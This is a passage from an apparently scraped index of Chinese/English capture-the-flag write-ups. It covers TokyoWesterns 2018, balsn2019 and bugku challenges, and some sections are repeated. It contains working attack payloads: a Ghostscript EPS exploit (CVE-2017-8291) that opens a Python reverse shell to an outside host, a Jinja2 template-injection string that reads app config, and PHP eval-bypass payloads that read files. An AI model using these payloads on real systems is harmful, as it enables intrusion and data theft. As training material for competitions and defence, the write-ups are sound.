read () @app.route ( '/conv' , methods = [ 'POST' ]) def conv (): f = request . files . get ( 'image' , None ) if not f : return redirect ( url_for ( 'index' )) ext = f . filename . split ( '.' )[ - 1 ] fname = tempfile . mktemp ( \"emoji\" ) fname = \"{}.{}\" . format ( fname , ext ) f . save ( fname ) img = Image . open ( fname ) w , h = img . size r = 128 / max ( w , h ) newimg = img . resize (( int ( w * r ), int ( h * r ))) newimg . save ( fname ) response = make_response () response . data = open ( fname , \"rb\" ) . read () response . headers [ 'Content-Disposition' ] = 'attachment; filename=emoji_{}' . format ( f . filename ) os . unlink ( fname ) return response if __name__ == '__main__' : app . run ( host = \"0.0.0.0\" , port = 8080 , debug = True ) it uses the PIL library which has been known to have RCEs by maliciously crafting image ( CVE-2017-8291 ). I\u2019ve been searching on google and found this interesting issue request that was written in seclists.org last month. 1 2 3 4 5 6 7 8 9 10 %!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 30 30 userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"harold.kim\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);') currentdevice putdeviceprops The result? well\u2026 1 2 3 4 5 6 7 8 9 root@imouto-router:/# nc -vlp 8080 Listening on [0.0.0.0] (family 0, port 8080) Connection from 45.123.200.35.bc.googleusercontent.com 53674 received! /bin/sh: 0: can't access tty; job control turned off $ cat /flag TWCTF{watch_0ut_gh0stscr1pt_everywhere}$ id uid=1000(emoji) gid=1000(emoji) groups=1000(emoji) $ exit root@imouto-router:/# (\u4e0d\u7406\u89e3) pysandbox1 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 import sys import ast blacklist = [ ast . Call , ast . Attribute ] def check ( node ): if isinstance ( node , list ): return all ([ check ( n ) for n in node ]) else : \"\"\" expr = BoolOp(boolop op, expr* values) | BinOp(expr left, operator op, expr right) | UnaryOp(unaryop op, expr operand) | Lambda(arguments args, expr body) | IfExp(expr test, expr body, expr orelse) | Dict(expr* keys, expr* values) | Set(expr* elts) | ListComp(expr elt, comprehension* generators) | SetComp(expr elt, comprehension* generators) | DictComp(expr key, expr value, comprehension* generators) | GeneratorExp(expr elt, comprehension* generators) -- the grammar constrains where yield expressions can occur | Yield(expr? value) -- need sequences for compare to distinguish between -- x < 4 < 3 and (x < 4) < 3 | Compare(expr left, cmpop* ops, expr* comparators) | Call(expr func, expr* args, keyword* keywords, expr? starargs, expr? kwargs) | Repr(expr value) | Num(object n) -- a number as a PyObject. | Str(string s) -- need to specify raw, unicode, etc? -- other literals? bools? -- the following expression can appear in assignment context | Attribute(expr value, identifier attr, expr_context ctx) | Subscript(expr value, slice slice, expr_context ctx) | Name(identifier id, expr_context ctx) | List(expr* elts, expr_context ctx) | Tuple(expr* elts, expr_context ctx) -- col_offset is the byte offset in the utf8 string the parser uses attributes (int lineno, int col_offset) \"\"\" attributes = { 'BoolOp' : [ 'values' ], 'BinOp' : [ 'left' , 'right' ], 'UnaryOp' : [ 'operand' ], 'Lambda' : [ 'body' ], 'IfExp' : [ 'test' , 'body' , 'orelse' ], 'Dict' : [ 'keys' , 'values' ], 'Set' : [ 'elts' ], 'ListComp' : [ 'elt' ], 'SetComp' : [ 'elt' ], 'DictComp' : [ 'key' , 'value' ], 'GeneratorExp' : [ 'elt' ], 'Yield' : [ 'value' ], 'Compare' : [ 'left' , 'comparators' ], 'Call' : False , # call is not permitted 'Repr' : [ 'value' ], 'Num' : True , 'Str' : True , 'Attribute' : False , # attribute is also not permitted 'Subscript' : [ 'value' ], 'Name' : True , 'List' : [ 'elts' ], 'Tuple' : [ 'elts' ], 'Expr' : [ 'value' ], # root node } for k , v in attributes . items (): if hasattr ( ast , k ) and isinstance ( node , getattr ( ast , k )): if isinstance ( v , bool ): return v return all ([ check ( getattr ( node , attr )) for attr in v ]) if __name__ == '__main__' : expr = sys . stdin . read () body = ast . parse ( expr ) . body if check ( body ): sys . stdout . write ( repr ( eval ( expr ))) else : sys . stdout . write ( \"Invalid input\" ) sys . stdout . flush () \u53c2\u8003 \u00b6 ctftime \u5b89\u5168\u5ba2 writeup exploitdb wp","title":"\u4e1c\u4eacCTF wp2018"},{"location":"writeup/TokyoCTF/#ctf-wp2018","text":"\u9898\u76ee\u4ed3\u5e93 writeup writeup","title":"\u4e1c\u4eacCTF wp2018"},{"location":"writeup/TokyoCTF/#shrine","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import flask import os app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = os . environ . pop ( 'FLAG' ) @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): def safe_jinja ( s ): s = s . replace ( '(' , '' ) . replace ( ')' , '' ) blacklist = [ 'config' , 'self' ] return '' . join ([ '{{ % s et {}=None%}}' . format ( c ) for c in blacklist ]) + s return flask . render_template_string ( safe_jinja ( shrine )) if __name__ == '__main__' : app . run ( debug = True ) Although config and self are unset, request is still available. I believed that app.config may be somewhere.. To search for it, I wrote a function to traverse over child attributes of request recursively: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # search.py def search ( obj , max_depth ): visited_clss = [] visited_objs = [] def visit ( obj , path = 'obj' , depth = 0 ): yield path , obj if depth == max_depth : return elif isinstance ( obj , ( int , float , bool , str , bytes )): return elif isinstance ( obj , type ): if obj in visited_clss : return visited_clss . append ( obj ) print ( obj ) else : if obj in visited_objs : return visited_objs . append ( obj ) # attributes for name in dir ( obj ): if name . startswith ( '__' ) and name . endswith ( '__' ): if name not in ( '__globals__' , '__class__' , '__self__' , '__weakref__' , '__objclass__' , '__module__' ): continue attr = getattr ( obj , name ) yield from visit ( attr , '{}.{}' . format ( path , name ), depth + 1 ) # dict values if hasattr ( obj , 'items' ) and callable ( obj . items ): try : for k , v in obj . items (): yield from visit ( v , '{}[{}]' . format ( path , repr ( k )), depth ) except : pass # items elif isinstance ( obj , ( set , list , tuple , frozenset )): for i , v in enumerate ( obj ): yield from visit ( v , '{}[{}]' . format ( path , repr ( i )), depth ) yield from visit ( obj ) \u540c\u65f6\u4fee\u6539app.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import flask import os from flask import request from search import search app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = 'TWCTF_FLAG' @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): for path , obj in search ( request , 10 ): if str ( obj ) == app . config [ 'FLAG' ]: return path if __name__ == '__main__' : app . run ( debug = True ) (tql\u8fd9\u4e2a\u5199\u7684) 1 2 3 4 5 6 7 $ python3 app . py & $ curl 0 : 5000 / shrine / 123 obj . application . __self__ . _get_data_for_json . __globals__ [ 'json' ] . JSONEncoder . default . __globals__ [ 'current_app' ] . config [ 'FLAG' ] $ curl - g \"http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}\" TWCTF { pray_f0r_sacred_jinja2 }","title":"shrine"},{"location":"writeup/TokyoCTF/#_1","text":"http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__}} \u7136\u540e\u641c\u7d22\uff1a After (CTRL+F)ed \u201cFlask\u201d word i just found an interesting variable called:current_app \u8bbf\u95ee\uff1a http://shrine.chal.ctf.westerns.tokyo/shrine/ > {{url_for. globals .current_app}} It means that we are in the application app.py again, so let\u2019s try to get in config now! 1 http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__.current_app.config}} \u6210\u529f\uff01 shrine","title":"\u53e6\u4e00\u79cd\u89e3\u6cd5"},{"location":"writeup/TokyoCTF/#simpleauth","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 <?php require_once 'flag.php' ; if ( ! empty ( $_SERVER [ 'QUERY_STRING' ])) { $query = $_SERVER [ 'QUERY_STRING' ]; $res = parse_str ( $query ); if ( ! empty ( $res [ 'action' ])){ $action = $res [ 'action' ]; } } if ( $action === 'auth' ) { if ( ! empty ( $res [ 'user' ])) { $user = $res [ 'user' ]; } if ( ! empty ( $res [ 'pass' ])) { $pass = $res [ 'pass' ]; } if ( ! empty ( $user ) && ! empty ( $pass )) { $hashed_password = hash ( 'md5' , $user . $pass ); } if ( ! empty ( $hashed_password ) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e' ) { echo $flag ; } else { echo 'fail :(' ; } } else { highlight_file ( __FILE__ ); } ?> \u6784\u9020URL 1 http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e","title":"SimpleAuth"},{"location":"writeup/TokyoCTF/#slack-emoji-converter","text":"\u5f97\u5230\u6e90\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from flask import ( Flask , render_template , request , redirect , url_for , make_response , ) from PIL import Image import tempfile import os app = Flask ( __name__ ) @app.route ( '/' ) def index (): return render_template ( 'index.html' ) @app.route ( '/source' ) def source (): return open ( __file__ ) . read () @app.route ( '/conv' , methods = [ 'POST' ]) def conv (): f = request . files . get ( 'image' , None ) if not f : return redirect ( url_for ( 'index' )) ext = f . filename . split ( '.' )[ - 1 ] fname = tempfile . mktemp ( \"emoji\" ) fname = \"{}.{}\" . format ( fname , ext ) f . save ( fname ) img = Image . open ( fname ) w , h = img . size r = 128 / max ( w , h ) newimg = img . resize (( int ( w * r ), int ( h * r ))) newimg . save ( fname ) response = make_response () response . data = open ( fname , \"rb\" ) . read () response . headers [ 'Content-Disposition' ] = 'attachment; filename=emoji_{}' . format ( f . filename ) os . unlink ( fname ) return response if __name__ == '__main__' : app . run ( host = \"0.0.0.0\" , port = 8080 , debug = True ) it uses the PIL library which has been known to have RCEs by maliciously crafting image ( CVE-2017-8291 ). I\u2019ve been searching on google and found this interesting issue request that was written in seclists.org last month. 1 2 3 4 5 6 7 8 9 10 %!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 30 30 userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"harold.kim\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);') currentdevice putdeviceprops The result? well\u2026 1 2 3 4 5 6 7 8 9 root@imouto-router:/# nc -vlp 8080 Listening on [0.0.0.0] (family 0, port 8080) Connection from 45.123.200.35.bc.googleusercontent.com 53674 received! /bin/sh: 0: can't access tty; job control turned off $ cat /flag TWCTF{watch_0ut_gh0stscr1pt_everywhere}$ id uid=1000(emoji) gid=1000(emoji) groups=1000(emoji) $ exit root@imouto-router:/# (\u4e0d\u7406\u89e3)","title":"slack emoji converter"},{"location":"writeup/TokyoCTF/#pysandbox1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 import sys import ast blacklist = [ ast . Call , ast . Attribute ] def check ( node ): if isinstance ( node , list ): return all ([ check ( n ) for n in node ]) else : \"\"\" expr = BoolOp(boolop op, expr* values) | BinOp(expr left, operator op, expr right) | UnaryOp(unaryop op, expr operand) | Lambda(arguments args, expr body) | IfExp(expr test, expr body, expr orelse) | Dict(expr* keys, expr* values) | Set(expr* elts) | ListComp(expr elt, comprehension* generators) | SetComp(expr elt, comprehension* generators) | DictComp(expr key, expr value, comprehension* generators) | GeneratorExp(expr elt, comprehension* generators) -- the grammar constrains where yield expressions can occur | Yield(expr? value) -- need sequences for compare to distinguish between -- x < 4 < 3 and (x < 4) < 3 | Compare(expr left, cmpop* ops, expr* comparators) | Call(expr func, expr* args, keyword* keywords, expr? starargs, expr? kwargs) | Repr(expr value) | Num(object n) -- a number as a PyObject. | Str(string s) -- need to specify raw, unicode, etc? -- other literals? bools? -- the following expression can appear in assignment context | Attribute(expr value, identifier attr, expr_context ctx) | Subscript(expr value, slice slice, expr_context ctx) | Name(identifier id, expr_context ctx) | List(expr* elts, expr_context ctx) | Tuple(expr* elts, expr_context ctx) -- col_offset is the byte offset in the utf8 string the parser uses attributes (int lineno, int col_offset) \"\"\" attributes = { 'BoolOp' : [ 'values' ], 'BinOp' : [ 'left' , 'right' ], 'UnaryOp' : [ 'operand' ], 'Lambda' : [ 'body' ], 'IfExp' : [ 'test' , 'body' , 'orelse' ], 'Dict' : [ 'keys' , 'values' ], 'Set' : [ 'elts' ], 'ListComp' : [ 'elt' ], 'SetComp' : [ 'elt' ], 'DictComp' : [ 'key' , 'value' ], 'GeneratorExp' : [ 'elt' ], 'Yield' : [ 'value' ], 'Compare' : [ 'left' , 'comparators' ], 'Call' : False , # call is not permitted 'Repr' : [ 'value' ], 'Num' : True , 'Str' : True , 'Attribute' : False , # attribute is also not permitted 'Subscript' : [ 'value' ], 'Name' : True , 'List' : [ 'elts' ], 'Tuple' : [ 'elts' ], 'Expr' : [ 'value' ], # root node } for k , v in attributes . items (): if hasattr ( ast , k ) and isinstance ( node , getattr ( ast , k )): if isinstance ( v , bool ): return v return all ([ check ( getattr ( node , attr )) for attr in v ]) if __name__ == '__main__' : expr = sys . stdin . read () body = ast . parse ( expr ) . body if check ( body ): sys . stdout . write ( repr ( eval ( expr ))) else : sys . stdout . write ( \"Invalid input\" ) sys . stdout . flush ()","title":"pysandbox1"},{"location":"writeup/TokyoCTF/#_2","text":"ctftime \u5b89\u5168\u5ba2 writeup exploitdb wp","title":"\u53c2\u8003"},{"location":"writeup/balsn2019/","text":"balsn2019 \u00b6 warmup | web \u00b6 \u5316\u7b80\u540e\u7684\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 <?php $secret = '<img src=\"qq.jpeg\">' ; highlight_file ( __FILE__ ); include ( \"config.php\" ); $op = @ $_GET [ 'op' ]; echo @ ( $op + 8 ); if ( @ strlen ( $op ) < 3 && @ ( $op + 8 ) < 'A_A' ) { // op=-9 \u8fdb\u5165\u8be5\u5206\u652f\uff0c'A_A'\u6b64\u5904\u7b49\u540c\u4e8e0 echo \"condition 1 \\n \" ; $_ = @ $_GET [ '\u03a3>\u2015(#\u00b0\u03c9\u00b0#)\u2661\u2192' ]; if ( preg_match ( '/[\\x00-!\\'0-9\"`&$.,|^[{_zdxfegavpos\\x7F]+/i' , $_ ) //\u96be\u641e \u8fd8\u5269\u4e0b\u4ec0\u4e48\u534f\u8bae\u6ca1\u88ab\u8fc7\u6ee4\u7684\u5417 || @ strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd // \u5b57\u7b26\u79cd\u7c7b\u572813\u4ee5\u5185 || @ strlen ( $_ ) > 19 ) { // \u603b\u8ba119\u5b57\u7b26\u4ee5\u5185 exit ( $secret ); } else { $ch = curl_init (); } echo \"you are in! \\n \" ; $str = strtolower ( eval ( \"return $_ ;\" )); $str = str_replace ( \" \\x63 :\" , \"ggininder\" , $str ); //c: $str = str_replace ( \"433a\" , \":(\" , $str ); //C: $str = str_replace ( \"633a\" , \":)\" , $str ); //c: $str = str_replace ( \"%63%3a\" , \"WTF\" , $str ); //c: $str = str_replace ( \"%33%33%61\" , \">__<\" , $str ); //33a $str = str_replace ( \"..\" , \"QAQ\" , $str ); $str = str_replace ( \"%2e%2e\" , \"Q___Q\" , $str ); //.. $str = str_replace ( \"%69%6e%74\" , \"XDDD\" , $str ); //int $str = str_replace ( \"int\" , \":DD\" , $str ); echo \"final str: \" . $str . '\\n' ; @ curl_setopt ( $ch , CURLOPT_URL , $str ); @ curl_setopt ( $ch , CURLOPT_RETURNTRANSFER , true ); @ curl_setopt ( $ch , CURLOPT_TIMEOUT , 1 ); @ curl_exec ( $ch ); } else { if ( @ strlen ( $op ) < 4 && @ ( $op + 78 ) < 'A__A' ) { // op=-99 \u8fdb\u5165\u8be5\u5206\u652f echo \"condition 2\" ; $_ = @ $_GET [ '\u2063' ]; //wdnmd \u8fd9\u91cc\u662f\u4e09\u4e2a\u4e0d\u53ef\u89c1\u5b57\u7b26 E281A3 echo print_r ( $_GET ); // \u9650\u5236\uff1a\u4e0d\u80fd\u4ee5.php\u7ed3\u5c3e, \u4e0d\u80fd\u5305\u542b \" < > amp .. $\uff0c\u6ee1\u8db3\u7684\u8bdd\u5c31\u4f1a\u628a\u8fd9\u4e2a\u6587\u4ef6\u663e\u793a\u51fa\u6765 if (( strtolower ( substr ( $_ , - 4 )) === '.php' ) // \u8fd9\u548b\u6574 || ( strtolower ( substr ( $_ , - 4 )) === 'php.' ) || ( stripos ( $_ , \" \\\" \" ) !== FALSE ) || ( stripos ( $_ , \" \\x3e \" ) !== FALSE ) || ( stripos ( $_ , \" \\x3c \" ) !== FALSE ) || ( stripos ( strtolower ( $_ ), \"amp\" ) !== FALSE )) { die ( $secret ); } else { if ( stripos ( $_ , \"..\" ) !== FalsE ) { die ( $secret ); } else { if ( stripos ( $_ , \" \\x24 \" ) !== FALSE ) { die ( $secret ); } else { print_r ( substr ( @ file_get_contents ( $_ ), 0 , 155 )); } } } } else { echo \"condition 3\" ; die ( $secret ); // \u63d0\u524ddie\u6389\u4e86\uff0cfake system ( $_GET [ 0x9487945 ]); } } \u5148\u770b\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u7684\u7ed5\u8fc7 1 2 3 4 5 6 7 8 9 php > var_dump(-1 < 'A__A'); php shell code:1: bool(true) php > var_dump(1 < 'A__A'); php shell code:1: bool(false) php > var_dump(0 < 'A__A'); php shell code:1: bool(false) \u6240\u4ee5 $op + 78 < 'A__A' \u53ea\u8981\u8ba9 $op = -79\u5373\u53ef \u6700\u6709\u8da3\u7684\u8fd8\u662f\u90a3\u4e2a\u770b\u4e0a\u53bb\u50cf\u7a7a\u7684 '' \u9700\u8981\u8bb0\u4f4f\u4e00\u4e9b\u5e38\u89c1\u7684\u5b57\u7b26 %7E \u5c31\u662f ~ 1 2 3 $_ = %28%7E%8F%97%8F%96%91%99%90%29%28%29 eval(\"return $_;\"); //\u4f1a\u6267\u884cphpinfo() \u5de6\u53f3\u62ec\u53f7(\u82f1\u6587)\u5c31\u662f %28%29 ,\u53d6\u53cd\u5c31\u662f %d7%d6 \u5206\u53f7\u53d6\u53cd\u540e\u662f %C4 \u4e8e\u662f\u901a\u8fc7\u5bf9 %8F%97%8F%96%91%99%90 \u8fdb\u884c\u53d6\u53cd\u5c31\u53ef\u4ee5\u5f97\u5230 phpinfo 1 2 3 4 5 6 php > var_dump(~(urldecode($c))); php shell code:1: string(7) \"phpinfo\" php > var_dump($c); php shell code:1: string(21) \"%8F%97%8F%96%91%99%90\" \u4e8e\u662f eval(\"return $_;\") \u5c31\u4f1a\u6267\u884c\u7c7b\u4f3c return (~)(); \uff0c\u6700\u7ec8\u6267\u884c\u4e86 phpinfo \u51fd\u6570 \u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u8bfb\u914d\u7f6e\u6587\u4ef6 config.php 1 2 3 4 5 6 def n ( s ): r = \"\" for i in s : r += chr ( ~ ( ord ( i )) & 0xFF ) r = \"~{}\" . format ( r ) return r \u7528\u6765\u8bfb\u6587\u4ef6\u7684payload 1 ({})({})\".format(n(\"readfile\"), n(\"c<<\")) \u7f16\u7801\u4e4b\u540e\u5f97\u5230\uff1a 1 %28%7E%8D%9A%9E%9B%99%96%93%9A%29%28%7E%9C%C3%C3%29 \u8bfb\u53d6\u5230\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff1a \u63a5\u4e0b\u6765\u9700\u8981\u8fdb\u884cSSRF\u6253mysql\u3002\u7136\u9e45\u5e76\u4e0d\u4f1a","title":"balsn2019"},{"location":"writeup/balsn2019/#balsn2019","text":"","title":"balsn2019"},{"location":"writeup/balsn2019/#warmup-web","text":"\u5316\u7b80\u540e\u7684\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 <?php $secret = '<img src=\"qq.jpeg\">' ; highlight_file ( __FILE__ ); include ( \"config.php\" ); $op = @ $_GET [ 'op' ]; echo @ ( $op + 8 ); if ( @ strlen ( $op ) < 3 && @ ( $op + 8 ) < 'A_A' ) { // op=-9 \u8fdb\u5165\u8be5\u5206\u652f\uff0c'A_A'\u6b64\u5904\u7b49\u540c\u4e8e0 echo \"condition 1 \\n \" ; $_ = @ $_GET [ '\u03a3>\u2015(#\u00b0\u03c9\u00b0#)\u2661\u2192' ]; if ( preg_match ( '/[\\x00-!\\'0-9\"`&$.,|^[{_zdxfegavpos\\x7F]+/i' , $_ ) //\u96be\u641e \u8fd8\u5269\u4e0b\u4ec0\u4e48\u534f\u8bae\u6ca1\u88ab\u8fc7\u6ee4\u7684\u5417 || @ strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd // \u5b57\u7b26\u79cd\u7c7b\u572813\u4ee5\u5185 || @ strlen ( $_ ) > 19 ) { // \u603b\u8ba119\u5b57\u7b26\u4ee5\u5185 exit ( $secret ); } else { $ch = curl_init (); } echo \"you are in! \\n \" ; $str = strtolower ( eval ( \"return $_ ;\" )); $str = str_replace ( \" \\x63 :\" , \"ggininder\" , $str ); //c: $str = str_replace ( \"433a\" , \":(\" , $str ); //C: $str = str_replace ( \"633a\" , \":)\" , $str ); //c: $str = str_replace ( \"%63%3a\" , \"WTF\" , $str ); //c: $str = str_replace ( \"%33%33%61\" , \">__<\" , $str ); //33a $str = str_replace ( \"..\" , \"QAQ\" , $str ); $str = str_replace ( \"%2e%2e\" , \"Q___Q\" , $str ); //.. $str = str_replace ( \"%69%6e%74\" , \"XDDD\" , $str ); //int $str = str_replace ( \"int\" , \":DD\" , $str ); echo \"final str: \" . $str . '\\n' ; @ curl_setopt ( $ch , CURLOPT_URL , $str ); @ curl_setopt ( $ch , CURLOPT_RETURNTRANSFER , true ); @ curl_setopt ( $ch , CURLOPT_TIMEOUT , 1 ); @ curl_exec ( $ch ); } else { if ( @ strlen ( $op ) < 4 && @ ( $op + 78 ) < 'A__A' ) { // op=-99 \u8fdb\u5165\u8be5\u5206\u652f echo \"condition 2\" ; $_ = @ $_GET [ '\u2063' ]; //wdnmd \u8fd9\u91cc\u662f\u4e09\u4e2a\u4e0d\u53ef\u89c1\u5b57\u7b26 E281A3 echo print_r ( $_GET ); // \u9650\u5236\uff1a\u4e0d\u80fd\u4ee5.php\u7ed3\u5c3e, \u4e0d\u80fd\u5305\u542b \" < > amp .. $\uff0c\u6ee1\u8db3\u7684\u8bdd\u5c31\u4f1a\u628a\u8fd9\u4e2a\u6587\u4ef6\u663e\u793a\u51fa\u6765 if (( strtolower ( substr ( $_ , - 4 )) === '.php' ) // \u8fd9\u548b\u6574 || ( strtolower ( substr ( $_ , - 4 )) === 'php.' ) || ( stripos ( $_ , \" \\\" \" ) !== FALSE ) || ( stripos ( $_ , \" \\x3e \" ) !== FALSE ) || ( stripos ( $_ , \" \\x3c \" ) !== FALSE ) || ( stripos ( strtolower ( $_ ), \"amp\" ) !== FALSE )) { die ( $secret ); } else { if ( stripos ( $_ , \"..\" ) !== FalsE ) { die ( $secret ); } else { if ( stripos ( $_ , \" \\x24 \" ) !== FALSE ) { die ( $secret ); } else { print_r ( substr ( @ file_get_contents ( $_ ), 0 , 155 )); } } } } else { echo \"condition 3\" ; die ( $secret ); // \u63d0\u524ddie\u6389\u4e86\uff0cfake system ( $_GET [ 0x9487945 ]); } } \u5148\u770b\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u7684\u7ed5\u8fc7 1 2 3 4 5 6 7 8 9 php > var_dump(-1 < 'A__A'); php shell code:1: bool(true) php > var_dump(1 < 'A__A'); php shell code:1: bool(false) php > var_dump(0 < 'A__A'); php shell code:1: bool(false) \u6240\u4ee5 $op + 78 < 'A__A' \u53ea\u8981\u8ba9 $op = -79\u5373\u53ef \u6700\u6709\u8da3\u7684\u8fd8\u662f\u90a3\u4e2a\u770b\u4e0a\u53bb\u50cf\u7a7a\u7684 '' \u9700\u8981\u8bb0\u4f4f\u4e00\u4e9b\u5e38\u89c1\u7684\u5b57\u7b26 %7E \u5c31\u662f ~ 1 2 3 $_ = %28%7E%8F%97%8F%96%91%99%90%29%28%29 eval(\"return $_;\"); //\u4f1a\u6267\u884cphpinfo() \u5de6\u53f3\u62ec\u53f7(\u82f1\u6587)\u5c31\u662f %28%29 ,\u53d6\u53cd\u5c31\u662f %d7%d6 \u5206\u53f7\u53d6\u53cd\u540e\u662f %C4 \u4e8e\u662f\u901a\u8fc7\u5bf9 %8F%97%8F%96%91%99%90 \u8fdb\u884c\u53d6\u53cd\u5c31\u53ef\u4ee5\u5f97\u5230 phpinfo 1 2 3 4 5 6 php > var_dump(~(urldecode($c))); php shell code:1: string(7) \"phpinfo\" php > var_dump($c); php shell code:1: string(21) \"%8F%97%8F%96%91%99%90\" \u4e8e\u662f eval(\"return $_;\") \u5c31\u4f1a\u6267\u884c\u7c7b\u4f3c return (~)(); \uff0c\u6700\u7ec8\u6267\u884c\u4e86 phpinfo \u51fd\u6570 \u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u8bfb\u914d\u7f6e\u6587\u4ef6 config.php 1 2 3 4 5 6 def n ( s ): r = \"\" for i in s : r += chr ( ~ ( ord ( i )) & 0xFF ) r = \"~{}\" . format ( r ) return r \u7528\u6765\u8bfb\u6587\u4ef6\u7684payload 1 ({})({})\".format(n(\"readfile\"), n(\"c<<\")) \u7f16\u7801\u4e4b\u540e\u5f97\u5230\uff1a 1 %28%7E%8D%9A%9E%9B%99%96%93%9A%29%28%7E%9C%C3%C3%29 \u8bfb\u53d6\u5230\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff1a \u63a5\u4e0b\u6765\u9700\u8981\u8fdb\u884cSSRF\u6253mysql\u3002\u7136\u9e45\u5e76\u4e0d\u4f1a","title":"warmup | web"},{"location":"writeup/bugku/","text":"bugku \u00b6 \u591a\u5f69 \u00b6 zsteg \u63d0\u53d6\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ zsteg -a 603fda27-2893-4e60-9d9f-39962b8c8440.png b1,bgr,lsb,xy .. text: \"flag.txt\" b2,g,lsb,xy .. file: 5View capture file b2,g,msb,xy .. file: VISX image file b2,b,msb,xy .. text: \"UUuUUWUUUUUuUUUU\" b2,bgr,lsb,xy .. text: \"AAAP@QUDQ\" b3,b,lsb,xy .. file: GLS_BINARY_MSB_FIRST b4,r,lsb,xy .. text: \"UDTTUEEDDEDEUEDDTEDETDEDDEDDDDTDUEEETDUDEUDDDDDDDDDDDDUDDDDDDDDDDDDDDDDDDDD\\\"322\\\"223##\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"#\\\"#\\\"\\\"\\\"3\\\"#\" b4,r,msb,xy .. text: \"333333333;\" b4,g,lsb,xy .. file: 5View capture file b4,g,msb,xy .. file: VISX image file b4,b,msb,xy .. text: [\"w\" repeated 12 times] b6,g,msb,xy .. text: \"4ES4EQ4MS4M\" Passing the -v flag into zsteg, we can get the hex dump of that extraction: \u63d0\u53d6 flag.txt \u5904\u7684\u4fe1\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 zsteg -v 603fda27-2893-4e60-9d9f-39962b8c8440.png b1,bgr,lsb,xy b1,bgr,lsb,xy .. text: \"flag.txt\" 00000000: 00 00 00 00 00 00 00 e3 50 4b 03 04 14 00 01 08 |........PK......| 00000010: 08 00 70 42 67 4c 37 20 ff 48 4d 00 00 00 43 00 |..pBgL7 .HM...C.| 00000020: 00 00 08 00 00 00 66 6c 61 67 2e 74 78 74 ce 98 |......flag.txt..| 00000030: 5e 65 7a ba 27 91 a6 eb 1b 25 54 f3 b9 6d 0f ca |^ez.'....%T..m..| 00000040: 78 7c 20 6a 79 e8 39 99 c8 df ad 3d 9a c8 4b fc |x| jy.9....=..K.| 00000050: 53 1d db 6e 95 9d 07 ae 1c 91 eb fe a7 18 33 00 |S..n..........3.| 00000060: 9e f5 12 8e 7f c6 e6 7e 1a c8 3d cf 94 97 2f b0 |.......~..=.../.| 00000070: 96 64 f3 a7 d1 94 64 23 98 3f 47 50 4b 01 02 3f |.d....d#.?GPK..?| 00000080: 00 14 00 01 08 08 00 